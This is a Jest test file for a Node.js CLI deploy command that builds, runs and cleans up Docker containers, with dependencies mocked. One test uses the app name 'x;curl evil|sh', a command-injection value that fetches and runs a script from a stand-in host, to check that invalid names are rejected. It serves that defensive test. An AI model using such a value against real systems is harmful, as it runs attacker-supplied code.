// src/commands/__tests__/deploy.test.js
const fs = require('fs-extra');
const path = require('path');
const { execFileSync } = require('child_process');

// Helper: does an execFileSync(file, args) invocation include this token?
const argvIncludes = (args, token) =>
  Array.isArray(args) && args.some((a) => String(a).includes(token));
const {
  deployCommand,
  verifyProjectStructure,
  copyDockerFiles,
  developmentDeploy,
  waitForContainer
} = require('../deploy');

// Mock external dependencies
jest.mock('fs-extra');
jest.mock('child_process');
jest.mock('path');

describe('Deploy Command', () => {
  // Mock process.exit
  const mockExit = jest.spyOn(process, 'exit').mockImplementation(() => {});
  
  afterAll(() => {
    mockExit.mockRestore();
  });
  beforeEach(() => {
    // Clear all mocks
    jest.clearAllMocks();
    
    // Setup default mock implementations
    fs.existsSync.mockReturnValue(true);
    fs.ensureDir.mockResolvedValue();
    fs.copy.mockResolvedValue();
    fs.remove.mockResolvedValue();
    fs.pathExists.mockResolvedValue(true);
    path.resolve.mockImplementation((...args) => args.join('/'));
    path.join.mockImplementation((...args) => args.join('/'));
    execFileSync.mockImplementation(() => '');
  });

  describe('verifyProjectStructure', () => {
    it('should pass when all required files exist', async () => {
      await expect(verifyProjectStructure()).resolves.not.toThrow();
      expect(fs.existsSync).toHaveBeenCalledTimes(5);
    });

    it('should throw error when files are missing', async () => {
      fs.existsSync.mockReturnValueOnce(false);
      await expect(verifyProjectStructure()).rejects.toThrow('Missing required files');
    });
  });

  describe('copyDockerFiles', () => {
    it('should copy Dockerfile and nginx config', async () => {
      await copyDockerFiles('/temp', 'shell');
      expect(fs.copy).toHaveBeenCalledTimes(2);
      expect(fs.copy).toHaveBeenCalledWith(
        expect.stringContaining('dockerfile.shell'),
        expect.stringContaining('Dockerfile')
      );
    });

    it('should throw error when Docker template not found', async () => {
      fs.existsSync.mockReturnValueOnce(false);
      await expect(copyDockerFiles('/temp', 'invalid')).rejects.toThrow('Docker template not found');
    });
  });

  describe('developmentDeploy', () => {
    const mockOptions = {
      name: 'test-app',
      port: 3000,
      type: 'shell',
      logs: false
    };

    it('should successfully deploy development container', async () => {
      execFileSync.mockImplementation((file, args) => {
        if (argvIncludes(args, 'inspect')) return 'running';
        return '';
      });

      await expect(developmentDeploy(mockOptions)).resolves.not.toThrow();
      expect(execFileSync).toHaveBeenCalledWith(
        'docker',
        expect.arrayContaining(['build']),
        expect.any(Object)
      );
      expect(execFileSync).toHaveBeenCalledWith(
        'docker',
        expect.arrayContaining(['run']),
        expect.any(Object)
      );
    });

    it('should handle existing container cleanup', async () => {
      execFileSync.mockImplementationOnce(() => { throw new Error(); }); // First build call swallowed
      execFileSync.mockImplementation((file, args) => {
        if (argvIncludes(args, 'inspect')) return 'running';
        return '';
      });

      await expect(developmentDeploy(mockOptions)).resolves.not.toThrow();
      expect(execFileSync).toHaveBeenCalledWith(
        'docker',
        expect.arrayContaining(['stop']),
        expect.any(Object)
      );
    });

    it('should mount volumes correctly', async () => {
      execFileSync.mockImplementation((file, args) => {
        if (argvIncludes(args, 'inspect')) return 'running';
        return '';
      });

      await developmentDeploy(mockOptions);
      expect(execFileSync).toHaveBeenCalledWith(
        'docker',
        expect.arrayContaining(['-v']),
        expect.any(Object)
      );
    });

    it('should throw error on build failure', async () => {
      execFileSync.mockImplementationOnce(() => { throw new Error('Build failed'); });
      await expect(developmentDeploy(mockOptions)).rejects.toThrow('Build failed');
    });
  });

  describe('deployCommand', () => {
    it('should handle development deployment', async () => {
      const options = {
        name: 'test-app',
        type: 'shell',
        env: 'development',
        port: 3000
      };

      execFileSync.mockImplementation((file, args) => {
        if (argvIncludes(args, 'inspect')) return 'running';
        return '';
      });

      await expect(deployCommand(options)).resolves.not.toThrow();
    });

    it('should throw error for production deployment', async () => {
      const options = {
        name: 'test-app',
        type: 'shell',
        env: 'production',
        port: 3000
      };

      await expect(deployCommand(options)).rejects.toThrow('Production deployment not yet implemented');
    });

    it('should reject an app name with shell/path metacharacters', async () => {
      const options = {
        name: 'x;curl evil|sh',
        type: 'shell',
        env: 'development',
        port: 3000,
      };

      await expect(deployCommand(options)).rejects.toThrow(/Invalid name/);
      // No docker invocation should have happened for a rejected name.
      expect(execFileSync).not.toHaveBeenCalled();
    });

    it('should throw error for unknown environment', async () => {
      const options = {
        name: 'test-app',
        type: 'shell',
        env: 'staging',
        port: 3000
      };

      await expect(deployCommand(options)).rejects.toThrow('Unknown environment: staging');
    });

    it('should handle deployment errors with DEBUG flag', async () => {
      const originalDebug = process.env.DEBUG;
      process.env.DEBUG = 'true';

      const options = {
        name: 'test-app',
        type: 'shell',
        env: 'development',
        port: 3000
      };

      const error = new Error('Deployment failed');
      error.stack = 'Error: Deployment failed\n  at test';
      execFileSync.mockImplementation(() => {
        throw error;
      });

      await expect(deployCommand(options)).rejects.toThrow('Deployment failed');

      process.env.DEBUG = originalDebug;
    });

    it('should handle deployment errors without DEBUG flag', async () => {
      const originalDebug = process.env.DEBUG;
      delete process.env.DEBUG;

      const options = {
        name: 'test-app',
        type: 'shell',
        env: 'development',
        port: 3000
      };

      execFileSync.mockImplementation(() => {
        throw new Error('Deployment failed');
      });

      await expect(deployCommand(options)).rejects.toThrow('Deployment failed');

      if (originalDebug) {
        process.env.DEBUG = originalDebug;
      }
    });

    it('should pass through verifyProjectStructure errors', async () => {
      const options = {
        name: 'test-app',
        type: 'shell',
        env: 'development',
        port: 3000
      };

      fs.existsSync.mockReturnValue(false);

      await expect(deployCommand(options)).rejects.toThrow('Missing required files');
    });
  });

  describe('Edge cases', () => {
    it('should handle logs option in development deployment', async () => {
      const options = {
        name: 'test-app',
        type: 'shell',
        env: 'development',
        port: 3000,
        logs: true
      };

      execFileSync.mockImplementation((file, args) => {
        if (argvIncludes(args, 'inspect')) return 'running';
        if (argvIncludes(args, 'logs')) return '';
        return '';
      });

      await expect(deployCommand(options)).resolves.not.toThrow();
    });

    it('should handle missing project files gracefully', async () => {
      const options = {
        name: 'test-app',
        type: 'shell',
        env: 'development',
        port: 3000
      };

      fs.pathExists.mockImplementation((filePath) => {
        // Only package.json exists
        return Promise.resolve(filePath.includes('package.json'));
      });

      execFileSync.mockImplementation((file, args) => {
        if (argvIncludes(args, 'inspect')) return 'running';
        return '';
      });

      await expect(deployCommand(options)).resolves.not.toThrow();
    });

    it('should handle Docker build errors', async () => {
      const options = {
        name: 'test-app',
        type: 'shell',
        env: 'development',
        port: 3000
      };

      execFileSync.mockImplementation((file, args) => {
        if (argvIncludes(args, 'build')) {
          const error = new Error('Build failed');
          error.message = 'Build failed';
          throw error;
        }
        if (argvIncludes(args, 'inspect')) return 'running';
        return '';
      });

      await expect(deployCommand(options)).rejects.toThrow();
    });
  });

  describe('waitForContainer', () => {
    it('should return true when container is running immediately', async () => {
      execFileSync.mockReturnValue('running\n');

      await expect(waitForContainer('test-container')).resolves.toBe(true);
    });
  });
});